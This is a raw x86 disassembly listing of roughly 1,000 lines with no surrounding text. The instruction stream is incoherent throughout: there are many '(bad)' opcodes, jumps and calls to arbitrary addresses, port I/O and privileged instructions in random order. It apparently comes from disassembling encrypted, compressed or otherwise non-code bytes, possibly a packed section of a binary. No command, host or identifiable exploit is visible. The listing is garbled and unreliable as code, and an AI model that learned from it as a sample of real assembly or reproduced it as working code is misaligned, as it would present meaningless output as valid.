  405f29:	mov    al,0x67
  405f2b:	pop    ss
  405f2c:	out    0x59,eax
  405f2e:	push   0x389aa467
  405f33:	mov    al,0xd6
  405f35:	mov    ebp,0x1ddf44c7
  405f3a:	loopne 0x405f2f
  405f3c:	dec    ebp
  405f3d:	out    dx,eax
  405f3e:	jnp    0x405f1c
  405f40:	pop    ebx
  405f41:	scas   eax,DWORD PTR es:[edi]
  405f42:	loop   0x405f1d
  405f44:	sbb    BYTE PTR ds:0x453fa792,0x6a
  405f4b:	mov    dl,0x2
  405f4d:	mov    ebx,0x859836c9
  405f52:	iret   
  405f53:	(bad)  
  405f54:	repnz push es
  405f56:	bound  edi,QWORD PTR [ebx+0x56d166ba]
  405f5c:	mov    fs,eax
  405f5e:	xchg   DWORD PTR [edi-0x56],ebp
  405f61:	out    0xf,eax
  405f63:	retf   
  405f64:	adc    ebx,DWORD PTR [eax+0x9797b7b]
  405f6a:	jmp    0x11eac5eb
  405f6f:	ja     0x405fc1
  405f71:	xchg   edi,eax
  405f72:	jp     0x405f80
  405f74:	fldenv [eax]
  405f76:	mov    esi,0x1b1aaf49
  405f7b:	mov    eax,0xe46322a5
  405f80:	sahf   
  405f81:	add    DWORD PTR [eax],ebx
  405f83:	js     0x405fc2
  405f85:	push   edi
  405f86:	xor    BYTE PTR [edi],dl
  405f88:	mov    BYTE PTR [esi],dl
  405f8a:	xor    ecx,DWORD PTR [edx+0x32c67311]
  405f90:	cmp    cl,dh
  405f92:	or     al,0xdb
  405f94:	jnp    0x40600b
  405f96:	jle    0x405fa3
  405f98:	push   ds
  405f99:	mov    BYTE PTR [ecx+eiz*2],bh
  405f9c:	enter  0xb641,0x6c
  405fa0:	into   
  405fa1:	pushf  
  405fa2:	stos   BYTE PTR es:[edi],al
  405fa3:	test   BYTE PTR [eax+0x7d],0xd5
  405fa7:	lahf   
  405fa8:	je     0x405fb4
  405faa:	cmp    ch,bl
  405fac:	aam    0xec
  405fae:	dec    DWORD PTR [ebp-0x1bc3db04]
  405fb4:	jl     0x405f74
  405fb6:	test   al,0xe5
  405fb8:	(bad)  
  405fb9:	ss mov ch,0x50
  405fbc:	inc    eax
  405fbd:	jnp    0x405f65
  405fbf:	add    BYTE PTR [edi+edi*8],0x6c
  405fc3:	xchg   edx,eax
  405fc4:	inc    esi
  405fc5:	aam    0xc1
  405fc7:	popa   
  405fc8:	out    0x29,al
  405fca:	push   ebp
  405fcb:	loope  0x405faa
  405fcd:	or     dh,bh
  405fcf:	add    ecx,edx
  405fd1:	jno    0x406036
  405fd3:	addr16 xchg ecx,eax
  405fd5:	xor    al,0x1a
  405fd7:	xchg   esp,eax
  405fd8:	xchg   ebp,eax
  405fd9:	lods   eax,DWORD PTR ds:[esi]
  405fda:	push   edx
  405fdb:	add    esi,DWORD PTR [ebp-0x6ef8985f]
  405fe1:	dec    eax
  405fe2:	ja     0x406004
  405fe4:	xchg   edx,eax
  405fe5:	fisubr WORD PTR [edi-0x43]
  405fe8:	lods   eax,DWORD PTR ds:[esi]
  405fe9:	sbb    al,0x9a
  405feb:	mov    esi,0x7cbe2949
  405ff0:	jb     0x406037
  405ff2:	into   
  405ff3:	adc    al,0xdc
  405ff5:	inc    eax
  405ff6:	ss xor bh,bl
  405ff9:	cmc    
  405ffa:	repnz mov cl,0xf1
  405ffd:	or     al,0x3e
  405fff:	mov    ch,0xbb
  406001:	rol    BYTE PTR [ebp+0x3a94d7f4],1
  406007:	mov    dl,BYTE PTR [eax]
  406009:	out    0x91,al
  40600b:	out    dx,al
  40600c:	test   eax,0xc176395c
  406011:	push   ss
  406012:	add    DWORD PTR [edi-0x4ce65dce],ebx
  406018:	cmp    al,0x1f
  40601a:	or     dl,BYTE PTR [ebp-0x49]
  40601d:	sub    eax,0xd351f2b8
  406022:	jecxz  0x405fdf
  406024:	pop    es
  406025:	mov    cl,0xcc
  406027:	rcl    ah,0xdb
  40602a:	jecxz  0x40600d
  40602c:	pop    edx
  40602d:	xchg   ecx,eax
  40602e:	(bad)  
  40602f:	bound  ebp,QWORD PTR [edx]
  406031:	cmp    al,0xf5
  406033:	sub    DWORD PTR [edi-0x229080b4],0xa
  40603a:	adc    ah,BYTE PTR [ecx+edi*2+0x4b1c80a9]
  406041:	pop    ebx
  406042:	cmp    esi,DWORD PTR [ebx-0x6cb789c8]
  406048:	call   0xbe731d26
  40604d:	nop
  40604e:	leave  
  40604f:	add    eax,0xcd442112
  406054:	clc    
  406055:	inc    ecx
  406056:	popa   
  406057:	add    ecx,DWORD PTR [edi-0x2d0913ee]
  40605d:	xchg   ebp,eax
  40605e:	and    eax,0x343276d
  406063:	mov    edi,0xfa08e2f2
  406068:	jp     0x40601d
  40606a:	inc    edx
  40606b:	mov    ecx,0xa11c885f
  406070:	pop    ss
  406071:	xchg   ebx,eax
  406072:	fcomp  QWORD PTR [ecx]
  406074:	pop    ecx
  406075:	push   es
  406076:	stos   BYTE PTR es:[edi],al
  406077:	dec    ebp
  406078:	xchg   BYTE PTR [ecx],ah
  40607a:	popa   
  40607b:	pop    ebp
  40607c:	xchg   edx,eax
  40607d:	sub    dh,ah
  40607f:	jge    0x406034
  406081:	pop    ds
  406082:	and    DWORD PTR [eax+0x1dda09a8],0xbfe2ae0b
  40608c:	push   edi
  40608d:	rcr    BYTE PTR [ecx],cl
  40608f:	xchg   ebx,eax
  406090:	pop    es
  406091:	pushf  
  406092:	or     DWORD PTR ds:0x653b9fb5,0x1d7929f2
  40609c:	imul   eax,DWORD PTR [eax+ecx*1],0x63
  4060a0:	adc    dh,0xea
  4060a3:	add    eax,ebx
  4060a5:	adc    ch,BYTE PTR [ecx+0x3b34a1e4]
  4060ab:	int    0x59
  4060ad:	sahf   
  4060ae:	loope  0x406071
  4060b0:	int3   
  4060b1:	jl     0x40606c
  4060b3:	xor    eax,0x294d73b9
  4060b8:	(bad)  [ebx-0x4]
  4060bb:	xchg   edi,eax
  4060bc:	or     DWORD PTR [ebx+ebp*8-0x9],ebx
  4060c0:	shl    DWORD PTR [ecx],1
  4060c2:	sbb    edx,DWORD PTR [ecx+0xa01662]
  4060c8:	jnp    0x4060bd
  4060ca:	xchg   BYTE PTR [edx-0x43],dl
  4060cd:	aam    0xf8
  4060cf:	fnsave [edx+0xbe0d8ba]
  4060d5:	jg     0x40608b
  4060d7:	or     esi,DWORD PTR [ebp+0x46]
  4060da:	xor    esp,ebx
  4060dc:	inc    ecx
  4060dd:	adc    al,BYTE PTR [ecx]
  4060df:	lahf   
  4060e0:	jl     0x4060cd
  4060e2:	js     0x4060fe
  4060e4:	push   ds
  4060e5:	push   esi
  4060e6:	retf   
  4060e7:	or     ecx,ebp
  4060e9:	or     al,0xb0
  4060eb:	test   al,0x7b
  4060ed:	and    di,dx
  4060f0:	sbb    ecx,DWORD PTR [edi-0x66]
  4060f3:	test   eax,0xd7447e14
  4060f8:	call   0x551cba81
  4060fd:	mov    bh,al
  4060ff:	xchg   esi,eax
  406100:	push   ecx
  406101:	(bad)  
  406102:	call   0x50de1eda
  406107:	xchg   edx,eax
  406108:	jmp    0xff4b12d1
  40610d:	dec    edi
  40610e:	add    eax,0x98150d0d
  406113:	out    0x7d,eax
  406115:	cmp    eax,ecx
  406117:	out    dx,eax
  406118:	push   edx
  406119:	push   edi
  40611a:	xor    eax,0x9c82e71b
  40611f:	pop    edx
  406120:	jns    0x40619f
  406122:	mov    ebp,0xba7c11e8
  406127:	dec    edx
  406128:	xor    eax,0xdeafff1
  40612d:	sub    al,0x54
  40612f:	imul   esp,DWORD PTR [edi-0x17a66b8b],0x63
  406136:	jns    0x406109
  406138:	mov    bl,0x1b
  40613a:	imul   edx,DWORD PTR [eax-0x55ed2d7f],0xffffff95
  406141:	pmaxub mm5,QWORD PTR [edx]
  406144:	pop    eax
  406145:	arpl   WORD PTR [ebp+0x68],di
  406148:	popf   
  406149:	pop    edx
  40614a:	cmp    WORD PTR [esp+edi*8-0x35],bp
  40614f:	and    al,0xa0
  406151:	loope  0x4060f8
  406153:	les    edx,FWORD PTR [edi+0x7379b431]
  406159:	shl    bh,cl
  40615b:	mov    dh,0x42
  40615d:	inc    esp
  40615e:	pop    ebx
  40615f:	(bad)  
  406160:	shl    DWORD PTR [ebx-0x68],cl
  406163:	fdiv   QWORD PTR [eax-0x25ecd1f8]
  406169:	push   es
  40616a:	lods   al,BYTE PTR ds:[esi]
  40616b:	not    dh
  40616d:	jl     0x406175
  40616f:	leave  
  406170:	sbb    eax,0x50c46e90
  406175:	mov    edx,0xde9e85a9
  40617a:	out    dx,eax
  40617b:	repnz lods eax,DWORD PTR ds:[esi]
  40617d:	jns    0x406148
  40617f:	pop    ss
  406180:	pop    ebx
  406181:	aad    0xdb
  406183:	imul   esi,DWORD PTR [ebx+0x5dd20f59],0xb3d75440
  40618d:	in     eax,dx
  40618e:	mov    ch,0xb6
  406190:	pop    ss
  406191:	aaa    
  406192:	add    eax,0xba8e70fe
  406197:	sub    BYTE PTR [esi+esi*4+0x70],cl
  40619b:	imul   edi,DWORD PTR [ecx+0x732a416d],0xffffff8a
  4061a2:	or     eax,0xdc3a011a
  4061a7:	fwait
  4061a8:	cmp    ebp,DWORD PTR [eax-0x19]
  4061ab:	(bad)  
  4061ac:	fnstcw WORD PTR [esi+0x4]
  4061af:	fwait
  4061b0:	xlat   BYTE PTR ds:[ebx]
  4061b1:	jo     0x40615f
  4061b3:	syscall 
  4061b5:	cmp    BYTE PTR [esi-0x39],ch
  4061b8:	sahf   
  4061b9:	sbb    al,0x33
  4061bb:	popf   
  4061bc:	sub    DWORD PTR ds:0x7cff66b6,esp
  4061c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061c3:	dec    ebx
  4061c4:	enter  0x229c,0x23
  4061c8:	aaa    
  4061c9:	or     eax,DWORD PTR [eax]
  4061cb:	outs   dx,DWORD PTR ds:[esi]
  4061cc:	add    eax,0xe25d3bf3
  4061d1:	lahf   
  4061d2:	test   al,0x7d
  4061d4:	test   eax,0x33c8407b
  4061d9:	sbb    ecx,DWORD PTR [ebx+0x2d812fc1]
  4061df:	adc    DWORD PTR [eax],ecx
  4061e1:	jno    0x4061f6
  4061e3:	cmp    ecx,eax
  4061e5:	push   edx
  4061e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061e7:	jge    0x406232
  4061e9:	arpl   sp,sp
  4061eb:	cmp    DWORD PTR [edx+0x49648f23],ebx
  4061f1:	pop    ecx
  4061f2:	lea    ebx,[ebx+0x6aefbc49]
  4061f8:	push   0x7f6479d2
  4061fd:	lock push ecx
  4061ff:	sbb    DWORD PTR [esi-0x3c5847cf],edi
  406205:	pop    ss
  406206:	add    dh,ah
  406208:	sub    eax,0x628532a4
  40620d:	fwait
  40620e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40620f:	sub    ebp,edx
  406211:	cmp    edi,edi
  406213:	add    al,0x97
  406215:	sar    DWORD PTR [eax+0x6ebb31c9],1
  40621b:	sbb    eax,esp
  40621d:	adc    dl,BYTE PTR [edx]
  40621f:	mov    ?,WORD PTR [ebp+0x6f3731d8]
  406225:	dec    edi
  406226:	pop    ds
  406227:	sbb    ecx,ecx
  406229:	xor    BYTE PTR [eax],ah
  40622b:	jne    0x4061f5
  40622d:	daa    
  40622e:	and    eax,ebx
  406230:	cmp    eax,DWORD PTR [ecx+0x72]
  406233:	mov    ch,0x85
  406235:	add    eax,0x18ec4921
  40623a:	mov    ebx,0x7cf5450c
  40623f:	xchg   ebx,eax
  406240:	sub    dl,BYTE PTR [eax-0x255e2eed]
  406246:	fwait
  406247:	imul   edx,DWORD PTR [esi*2+0x11c7fea1],0xd
  40624f:	push   edi
  406250:	in     al,0x8f
  406252:	sbb    DWORD PTR [edi+edi*1],edx
  406255:	push   edi
  406256:	fadd   DWORD PTR [eax-0xd1576c]
  40625c:	pop    edx
  40625d:	into   
  40625e:	movaps xmm6,XMMWORD PTR ds:0x76b6b502
  406265:	pop    ss
  406266:	mov    dh,0xe6
  406268:	neg    BYTE PTR [edx-0x1e]
  40626b:	mov    ebp,0xb776a1cb
  406270:	int3   
  406271:	scas   eax,DWORD PTR es:[edi]
  406272:	call   0x344e3c1c
  406277:	ss push 0x57
  40627a:	call   0x4405:0xd072cdca
  406281:	(bad)  
  406282:	xor    BYTE PTR [edx],ch
  406284:	fsubr  st,st(0)
  406286:	and    al,0xd7
  406288:	daa    
  406289:	mov    ecx,0xcda95631
  40628e:	sahf   
  40628f:	push   esi
  406290:	(bad)  
  406292:	test   ecx,0xe568beaf
  406298:	shl    BYTE PTR [ecx],1
  40629a:	jmp    0x40627d
  40629c:	mov    ecx,0x24865f92
  4062a1:	and    ecx,DWORD PTR [eax-0x4be1feb2]
  4062a7:	sbb    edi,DWORD PTR [esi+0x5b193fbf]
  4062ad:	xor    al,0x6e
  4062af:	aas    
  4062b0:	in     al,0x43
  4062b2:	nop
  4062b3:	sub    edx,ebx
  4062b5:	adc    edi,esp
  4062b7:	lods   al,BYTE PTR ds:[esi]
  4062b8:	push   ss
  4062b9:	jmp    0xefe16cd9
  4062be:	jmp    0x819d684d
  4062c3:	xlat   BYTE PTR ds:[ebx]
  4062c4:	pop    es
  4062c5:	and    al,0x5e
  4062c7:	or     edx,ebx
  4062c9:	int3   
  4062ca:	mov    dh,0xa9
  4062cc:	mov    bl,0xc5
  4062ce:	cmp    DWORD PTR [eax+ebp*4-0x3edc4361],ecx
  4062d5:	imul   eax,DWORD PTR [edi+ecx*4],0x7f
  4062d9:	call   0x53565bd9
  4062de:	(bad)  
  4062df:	sub    edi,ebx
  4062e1:	ins    DWORD PTR es:[edi],dx
  4062e2:	inc    ebx
  4062e3:	outs   dx,BYTE PTR ds:[esi]
  4062e4:	(bad)
  4062e8:	adc    DWORD PTR [edx-0x19242b1d],esi
  4062ee:	jge    0x4062fc
  4062f0:	add    DWORD PTR [ebx+0x6f],edx
  4062f3:	mov    BYTE PTR [eax-0x3a7233],ch
  4062f9:	pop    ds
  4062fa:	mov    cl,0x98
  4062fc:	pop    ebp
  4062fd:	adc    al,0x29
  4062ff:	push   esp
  406300:	(bad)  
  406302:	nop
  406303:	xor    edx,DWORD PTR [ecx-0x5d6fa2fa]
  406309:	push   esi
  40630a:	adc    al,0xd
  40630c:	fisubr DWORD PTR [ebp+0x20]
  40630f:	or     al,BYTE PTR [esi-0x64]
  406312:	push   ebx
  406313:	inc    esi
  406314:	aad    0xf3
  406316:	data16 (bad) ds:0xb1f7d9a2
  40631d:	nop
  40631e:	ret    0x90ba
  406321:	std    
  406322:	inc    edi
  406323:	sti    
  406324:	arpl   WORD PTR [edi],dx
  406326:	xor    esp,ecx
  406328:	jge    0x406376
  40632a:	mov    ds:0x95b79a03,al
  40632f:	shl    esi,1
  406331:	das    
  406332:	xor    DWORD PTR [edi-0x1d],0xf2741a6c
  406339:	dec    ebp
  40633a:	adc    ebx,ecx
  40633c:	outs   dx,BYTE PTR ds:[esi]
  40633d:	inc    ecx
  40633e:	mov    ebx,0x6be2dc73
  406343:	add    al,0xea
  406345:	add    dl,dh
  406347:	add    bl,bl
  406349:	jmp    0x406361
  40634b:	and    BYTE PTR [ebx+0x4837033b],bh
  406351:	in     al,dx
  406352:	ret    
  406353:	jg     0x4062e5
  406355:	mov    BYTE PTR [ebp-0x4ae5e9e9],ch
  40635b:	fiadd  DWORD PTR [ebp-0x2d]
  40635e:	cmc    
  40635f:	gs xchg esi,eax
  406361:	mov    eax,ds:0x7df1bffc
  406366:	fisttp DWORD PTR [ecx-0x73431351]
  40636c:	jl     0x406335
  40636e:	iret   
  40636f:	rol    DWORD PTR [edi-0x3d],cl
  406372:	test   al,0x56
  406374:	or     bh,BYTE PTR [ecx]
  406376:	out    dx,eax
  406377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406378:	mov    DWORD PTR [edx-0x19d0bd5f],eax
  40637e:	not    BYTE PTR [esi+0x22]
  406381:	pop    edi
  406382:	sahf   
  406383:	(bad)  
  406386:	jb     0x4063c9
  406388:	fstp   QWORD PTR [ecx+0x5e]
  40638b:	sub    al,0x8e
  40638d:	lods   eax,DWORD PTR ds:[esi]
  40638e:	rol    esi,cl
  406390:	ins    BYTE PTR es:[edi],dx
  406391:	pop    edi
  406392:	and    al,0xb
  406394:	ret    
  406395:	push   ebx
  406396:	or     ebx,esp
  406398:	in     eax,dx
  406399:	nop
  40639a:	retf   0x2b4a
  40639d:	fs sahf 
  40639f:	xchg   esp,eax
  4063a0:	mov    al,ds:0x762ef090
  4063a5:	mov    esi,0x96f4205f
  4063aa:	adc    BYTE PTR [edi-0x15970f6a],bl
  4063b0:	nop
  4063b1:	data16 or BYTE PTR [ecx],dh
  4063b4:	inc    eax
  4063b5:	cmp    DWORD PTR [esi+0x4cdd4a71],edx
  4063bb:	and    al,0x30
  4063bd:	test   DWORD PTR [ecx+edi*4-0x7a],esp
  4063c1:	and    eax,0x5a176cfe
  4063c6:	cwde   
  4063c7:	adc    DWORD PTR ds:0xbb0f3b87,esi
  4063cd:	mov    ss,WORD PTR [esi]
  4063cf:	les    ebx,FWORD PTR [edi-0x77]
  4063d2:	pop    esi
  4063d3:	(bad)  
  4063d4:	test   ch,al
  4063d6:	test   DWORD PTR [edx],ebx
  4063d8:	jge    0x406385
  4063da:	mov    edi,DWORD PTR [edx]
  4063dc:	xor    DWORD PTR [edx-0x1a],esi
  4063df:	retf   0xf215
  4063e2:	dec    edx
  4063e3:	retf   0xd83b
  4063e6:	sbb    esi,DWORD PTR [esp+ecx*4-0x612b7a9c]
  4063ed:	sub    eax,0x8e7b0c6e
  4063f2:	push   0xffffff97
  4063f4:	xchg   ebx,eax
  4063f5:	inc    ecx
  4063f6:	jmp    0xa9424a20
  4063fb:	jg     0x4063c8
  4063fd:	imul   ebx,ecx,0x39
  406400:	sub    BYTE PTR [edi+eiz*4+0x31714c8f],bl
  406407:	(bad)  
  406408:	xacquire xchg DWORD PTR [eax],eax
  40640b:	mov    al,ds:0xfe7a5cfa
  406410:	pop    ecx
  406411:	repz or al,0x42
  406414:	sti    
  406415:	lock pushf 
  406417:	dec    esi
  406418:	jb     0x40639f
  40641a:	(bad)  
  40641b:	dec    esi
  40641c:	dec    edx
  40641d:	push   edx
  40641e:	rcl    DWORD PTR [esi-0x786418af],0x4d
  406425:	xchg   ecx,eax
  406426:	(bad)  
  406427:	jp     0x406404
  406429:	mov    eax,0x4c431e97
  40642e:	ins    DWORD PTR es:[edi],dx
  40642f:	call   0xde014335
  406434:	test   eax,0xe45d883b
  406439:	mov    ch,0x40
  40643b:	pop    esp
  40643c:	das    
  40643d:	push   ds
  40643e:	pop    edx
  40643f:	dec    ebp
  406440:	mov    cl,0xc6
  406442:	inc    esp
  406443:	add    ebx,edi
  406445:	out    dx,al
  406446:	js     0x4063cd
  406448:	mov    edx,0x87a5724b
  40644d:	sbb    ebx,ecx
  40644f:	dec    esi
  406450:	leave  
  406451:	leave  
  406452:	jne    0x40641e
  406454:	out    0x29,al
  406456:	or     edx,DWORD PTR [edx+0x766ff07]
  40645c:	cmp    al,0xe0
  40645e:	in     eax,0xc6
  406460:	inc    esi
  406461:	dec    edi
  406462:	mov    dh,BYTE PTR [edi-0x4f]
  406465:	pop    edi
  406466:	push   0x9d9689d2
  40646b:	(bad)  
  40646c:	jo     0x406401
  40646e:	lock sti 
  406470:	xchg   esi,eax
  406471:	sub    edi,esp
  406473:	sub    ah,bl
  406475:	lds    ecx,FWORD PTR [edx+eiz*4+0x4c315020]
  40647c:	fsubr  QWORD PTR [esi+eax*1]
  40647f:	loope  0x406411
  406481:	and    dl,BYTE PTR [ebx+0x53]
  406484:	out    0xf2,al
  406486:	fwait
  406487:	(bad)  
  406488:	out    dx,eax
  406489:	lahf   
  40648a:	vpsubsb xmm2,xmm1,xmm1
  40648f:	and    al,0x81
  406491:	ss sbb esi,esi
  406494:	loopne 0x406420
  406496:	push   edi
  406497:	xchg   BYTE PTR [bx+0xeba],ah
  40649c:	or     eax,0x3de90fe5
  4064a1:	rcr    ebx,0x4e
  4064a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064a5:	push   edx
  4064a6:	sbb    eax,0xd9106304
  4064ab:	dec    ecx
  4064ac:	imul   ecx,DWORD PTR [ebp+edi*2-0x7],0x16
  4064b1:	mov    cl,BYTE PTR [edx+0x381f980f]
  4064b7:	lea    edx,[edi]
  4064b9:	mov    dl,BYTE PTR ds:0xf91e322b
  4064bf:	ds mov ebp,ds
  4064c2:	and    eax,0x285b6657
  4064c7:	out    dx,eax
  4064c8:	sub    BYTE PTR cs:[eax],0xdd
  4064cc:	dec    esi
  4064cd:	mov    bl,0x2d
  4064cf:	lods   eax,DWORD PTR ds:[esi]
  4064d0:	mov    ah,0x50
  4064d2:	lea    ecx,[eax]
  4064d4:	jp     0x40647f
  4064d6:	sub    edx,DWORD PTR ds:0xbd3f994c
  4064dc:	out    0xfc,al
  4064de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064df:	dec    esp
  4064e0:	pop    ss
  4064e1:	mov    eax,0x49d4cfec
  4064e6:	jnp    0x4064d7
  4064e8:	mov    eax,ds:0xff475b2f
  4064ed:	and    al,0x3c
  4064ef:	push   0x50f662cc
  4064f4:	cmp    bl,BYTE PTR [eax+0x627a5d46]
  4064fa:	rol    dh,0x89
  4064fd:	adc    ecx,ebp
  4064ff:	cmp    esp,esi
  406501:	mov    al,ds:0x8cafb4b1
  406506:	mov    esi,0x86f6487d
  40650b:	push   ebx
  40650c:	(bad)  
  40650d:	xchg   ebx,eax
  40650e:	arpl   sp,dx
  406510:	dec    edi
  406511:	mov    ecx,0x2790ad3b
  406516:	xchg   esi,eax
  406517:	mov    edi,0xfc3b0357
  40651c:	enter  0x25c9,0xb8
  406520:	out    0x68,al
  406522:	and    al,0x8b
  406524:	or     eax,0x6daf9933
  406529:	retf   
  40652a:	pop    eax
  40652b:	mov    edx,0xf92a67c1
  406530:	aas    
  406531:	mov    cl,0x7f
  406533:	xchg   ecx,eax
  406534:	(bad)  
  406535:	xor    al,0x3e
  406537:	loop   0x4064f2
  406539:	jb     0x4064da
  40653b:	sbb    dl,bh
  40653d:	aam    0xb8
  40653f:	jno    0x406511
  406541:	xchg   BYTE PTR [edi+0x57254a17],dh
  406547:	cmp    BYTE PTR [ecx-0x405c0595],dh
  40654d:	mov    dh,0x58
  40654f:	mov    BYTE PTR [ecx+ebx*4],al
  406552:	vmwrite ebp,DWORD PTR [esi-0x7c7b703a]
  406559:	sbb    eax,0x357ee07e
  40655e:	outs   dx,DWORD PTR ds:[esi]
  40655f:	mov    cl,0xb1
  406561:	mov    dh,0x65
  406563:	loopne 0x4065b3
  406565:	js     0x40651e
  406567:	xchg   ebx,eax
  406568:	addr16 cli 
  40656a:	or     eax,0x3b8412ab
  40656f:	data16 jmp 0x4065de
  406572:	into   
  406573:	pop    ds
  406574:	popf   
  406575:	in     eax,0x3c
  406577:	dec    ebp
  406578:	mov    ch,0xcb
  40657a:	adc    al,0x82
  40657c:	sbb    edi,DWORD PTR [edi+0x209c0b5f]
  406582:	xor    esi,eax
  406584:	mov    DWORD PTR [edx],ecx
  406586:	sbb    eax,esi
  406588:	or     DWORD PTR [edi+eax*1-0x34a9a67b],edx
  40658f:	jae    0x406543
  406591:	pusha  
  406592:	out    0xff,eax
  406594:	jae    0x406588
  406596:	fldcw  WORD PTR [esi+0x4cc1d424]
  40659c:	(bad)  
  40659d:	rcl    BYTE PTR [ebp+ebp*4-0xe2c4744],0xcc
  4065a5:	(bad)  
  4065a6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4065a8:	jns    0x4065e9
  4065aa:	push   0xf363089
  4065af:	xor    edx,DWORD PTR [edx]
  4065b1:	jmp    0x406620
  4065b3:	cld    
  4065b4:	js     0x40656d
  4065b6:	sti    
  4065b7:	sub    DWORD PTR [edx],ecx
  4065b9:	xor    BYTE PTR [esi+0x1f74ea51],dl
  4065bf:	repz in eax,0xdc
  4065c2:	cmp    al,0xc5
  4065c4:	aam    0xe8
  4065c6:	pop    ss
  4065c7:	dec    ebp
  4065c8:	loopne 0x4065aa
  4065ca:	jp     0x40662b
  4065cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065cd:	nop
  4065ce:	mov    ds:0xdc3560c6,al
  4065d3:	mov    ecx,0xa91e1264
  4065d8:	sbb    edx,esi
  4065da:	sti    
  4065db:	fs inc edi
  4065dd:	dec    ebp
  4065de:	jb     0x406654
  4065e0:	popa   
  4065e1:	lods   al,BYTE PTR ds:[esi]
  4065e2:	stos   BYTE PTR es:[edi],al
  4065e3:	jmp    0xecc7:0x6bfc0071
  4065ea:	xlat   BYTE PTR ds:[ebx]
  4065eb:	aaa    
  4065ec:	imul   esp,edx,0xffffffa0
  4065ef:	sti    
  4065f0:	mov    fs,WORD PTR [edx+0x34a235aa]
  4065f6:	dec    edx
  4065f7:	int3   
  4065f8:	fstp   TBYTE PTR [edx-0x26c69c6f]
  4065fe:	leave  
  4065ff:	adc    eax,0xd45e492e
  406604:	mov    esp,0xfeb9f5f8
  406609:	outs   dx,BYTE PTR ds:[esi]
  40660a:	lahf   
  40660b:	ret    0x151d
  40660e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40660f:	jno    0x40666c
  406611:	fdiv   st,st(4)
  406613:	not    DWORD PTR [esi-0x3d6a1462]
  406619:	dec    ecx
  40661a:	fsubp  st(5),st
  40661c:	cmp    al,0xe
  40661e:	mov    al,0x71
  406620:	push   esp
  406621:	xchg   ebp,eax
  406622:	xor    bh,dh
  406624:	jbe    0x406650
  406626:	retf   0x5196
  406629:	jne    0x406607
  40662b:	xor    ebp,edi
  40662d:	mov    bl,0xa6
  40662f:	mov    ch,0xd1
  406631:	xor    dh,cl
  406633:	cmp    BYTE PTR [ecx],bl
  406635:	retf   0xb494
  406638:	jecxz  0x406679
  40663a:	test   al,0x7d
  40663c:	adc    ch,BYTE PTR [ecx+eiz*2-0x29f9cd15]
  406643:	in     eax,0xbc
  406645:	mov    dh,BYTE PTR ds:0x48bd60e8
  40664b:	push   esi
  40664c:	jno    0x406647
  40664e:	xchg   ebx,eax
  40664f:	jp     0x406655
  406651:	in     al,dx
  406652:	ficomp WORD PTR [ecx-0x61b67860]
  406658:	add    al,0xaf
  40665a:	push   ebp
  40665b:	out    0x3d,al
  40665d:	push   cs
  40665e:	pop    edi
  40665f:	lahf   
  406660:	mov    ch,0x14
  406662:	(bad)  
  406663:	fwait
  406664:	and    eax,0x60
  406667:	mov    ebx,0xd5185c39
  40666c:	jmp    0x356b:0xc8fb1eb4
  406673:	inc    edx
  406674:	or     edx,0xffffff9b
  406677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406678:	jno    0x4066c1
  40667a:	xor    cl,BYTE PTR [ecx+eiz*2+0x36]
  40667e:	mov    ecx,0xc7cfd440
  406683:	mov    ebx,0x388cf88f
  406688:	push   ebp
  406689:	or     DWORD PTR [edi],edi
  40668b:	test   al,0x2b
  40668d:	cld    
  40668e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40668f:	mov    edx,0x4a4f055b
  406694:	nop
  406695:	push   DWORD PTR [esi]
  406697:	neg    BYTE PTR [ebp+0x62]
  40669a:	push   edi
  40669b:	out    0x80,al
  40669d:	ret    
  40669e:	inc    edx
  40669f:	out    dx,al
  4066a0:	push   ss
  4066a1:	daa    
  4066a2:	(bad)  
  4066a3:	push   edi
  4066a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a5:	xchg   DWORD PTR [eax],ecx
  4066a7:	or     al,0xaf
  4066a9:	adc    edi,DWORD PTR [edx+0x5a663f92]
  4066af:	(bad)  
  4066b0:	pop    ebx
  4066b1:	and    DWORD PTR [eax+0x21],0x8e33e1a0
  4066b8:	daa    
  4066b9:	sahf   
  4066ba:	inc    esi
  4066bb:	enter  0xc5a2,0x3c
  4066bf:	stos   BYTE PTR es:[edi],al
  4066c0:	pop    esp
  4066c1:	mov    ebx,0x215215c9
  4066c6:	push   ebp
  4066c7:	sub    BYTE PTR [edi],bl
  4066c9:	xor    edx,DWORD PTR [eax-0x6dd34160]
  4066cf:	and    al,BYTE PTR [edi-0x5cab7a58]
  4066d5:	test   ecx,ecx
  4066d7:	mov    BYTE PTR [ebp-0x5],cl
  4066da:	adc    DWORD PTR [esi*2+0x3d37089e],0x3d
  4066e2:	xchg   BYTE PTR [edi+0x7dd5343f],ah
  4066e8:	lods   al,BYTE PTR ds:[esi]
  4066e9:	sbb    BYTE PTR [ecx+0x50a7b9ff],dh
  4066ef:	jno    0x406721
  4066f1:	push   ecx
  4066f2:	sub    eax,0x1056b0ca
  4066f7:	arpl   WORD PTR [eax],si
  4066f9:	mov    esp,0xd80c1803
  4066fe:	out    dx,al
  4066ff:	sub    edi,edi
  406701:	test   al,0xac
  406703:	fcom   DWORD PTR [esi+ebp*4]
  406706:	or     BYTE PTR ds:[eax+0x18],0xb2
  40670b:	mov    dl,0x86
  40670d:	inc    ebx
  40670e:	mov    ch,0x0
  406710:	jae    0x40675d
  406712:	gs or  al,0xb1
  406715:	mov    BYTE PTR [esi+0x62497a9],bl
  40671b:	xor    al,0x54
  40671d:	cmp    ecx,DWORD PTR [ebx-0x4b]
  406720:	lds    eax,FWORD PTR [eax+0x2f]
  406723:	loopne 0x4066c8
  406725:	xor    eax,0xf50644f4
  40672a:	mov    edi,0x7e7144bd
  40672f:	mov    cl,0x51
  406731:	cdq    
  406732:	test   esi,eax
  406734:	stc    
  406735:	push   0x7a
  406737:	push   ds
  406738:	adc    eax,0xb9aab803
  40673d:	mov    ?,esp
